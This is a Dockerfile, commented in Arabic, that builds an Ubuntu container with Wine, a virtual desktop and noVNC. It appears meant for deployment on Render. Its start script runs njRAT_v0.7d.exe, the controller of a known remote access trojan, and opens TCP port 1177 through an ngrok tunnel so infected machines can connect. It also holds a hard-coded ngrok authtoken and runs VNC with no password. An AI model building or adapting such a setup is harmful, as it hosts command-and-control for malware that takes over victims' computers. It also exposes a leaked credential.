FROM ubuntu:22.04

# منع التفاعل أثناء التثبيت لضمان عدم توقف البناء سحابياً
ENV DEBIAN_FRONTEND=noninteractive

# تثبيت التحديثات الأساسية وحزم الواجهة الرسومية وخادم noVNC وبيئة تشغيل تطبيقات ويندوز/الـ .NET
RUN dpkg --add-architecture i386 && \
    apt-get update && apt-get install -y \
    xvfb \
    x11vnc \
    novnc \
    websockify \
    fluxbox \
    wine32 \
    wine64 \
    winetricks \
    curl \
    gnupg \
    && rm -rf /var/lib/apt/lists/*
# تثبيت أداة Ngrok الرسمية عبر مستودع الحزم المعتمد لنظام Ubuntu
RUN curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | gpg --dearmor -o /etc/apt/keyrings/ngrok.gpg && \
    echo "deb [signed-by=/etc/apt/keyrings/ngrok.gpg] https://ngrok-agent.s3.amazonaws.com buster main" | tee /etc/apt/sources.list.d/ngrok.list && \
    apt-get update && apt-get install -y ngrok

WORKDIR /app

# نسخ جميع ملفات المشروع من المستودع إلى الحاوية
COPY . /app

# Render يفرض فتح منفذ للويب، المنفذ الافتراضي للخطة المجانية هو 10000
EXPOSE 10000

# كتابة سكريبت الإقلاع لتشغيل النظام الرسومي والنفق والبرنامج معاً
RUN echo '#!/bin/bash

# تشغيل سطح المكتب الافتراضي
Xvfb :1 -screen 0 1024x768x16 &
export DISPLAY=:1
sleep 2
fluxbox &
x11vnc -forever -shared -bg -nopw -display :1 &

# تهيئة Wine لتشغيل .NET Framework (يتم مرة واحدة فقط)
# هذا الأمر سيظهر لك سجلات التثبيت إذا حدث خطأ
winetricks -q dotnet40 2>&1 | tee /app/winetricks.log

# تشغيل Ngrok (تأكد من وضع التوكن الصحيح)
ngrok config add-authtoken Cr_3GGdkvG7pObxEzyudWvsReOI1J4
ngrok tcp 1177 &

# تشغيل البرنامج مع إعادة توجيه الأخطاء لتراها في سجلات Render
# تأكد من أن اسم الملف في مستودعك أصبح بدون مسافات، مثلاً: njRAT_v0.7d.exe
wine /app/njRAT_v0.7d.exe 2>&1 | tee /app/wine.log &

# تشغيل noVNC
/usr/share/novnc/utils/launch.sh --vnc localhost:5900 --listen 10000\n\
' > /app/start.sh && chmod +x /app/start.sh

CMD ["/app/start.sh"]
